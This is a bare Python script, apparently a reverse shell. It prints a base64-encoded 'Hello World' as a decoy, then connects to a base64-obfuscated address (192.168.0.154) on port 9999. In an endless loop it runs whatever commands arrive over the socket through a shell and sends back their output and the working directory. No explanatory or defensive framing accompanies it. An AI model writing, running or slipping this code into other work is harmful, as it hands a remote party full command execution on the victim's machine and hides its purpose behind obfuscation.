import os as o
import socket as s
import subprocess as sp
import base64

def x():
    msg = base64.b64decode(b'SGVsbG8gV29ybGQ=').decode('utf-8')  # "Hello World"
    print(msg)

x()

sock = s.socket()
host = base64.b64decode(b'MTkyLjE2OC4wLjE1NA==').decode('utf-8')  # '192.168.0.154'
port = 9999
sock.connect((host, port))

while True:
    data = sock.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        try:
            o.chdir(data[3:].decode('utf-8'))
        except Exception as e:
            sock.send(str(e).encode('utf-8'))
    if len(data) > 0:
        proc = sp.Popen(data.decode('utf-8'), shell=True,
                        stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
        out = proc.stdout.read() + proc.stderr.read()
        sock.send(out + o.getcwd().encode('utf-8') + b'> ')
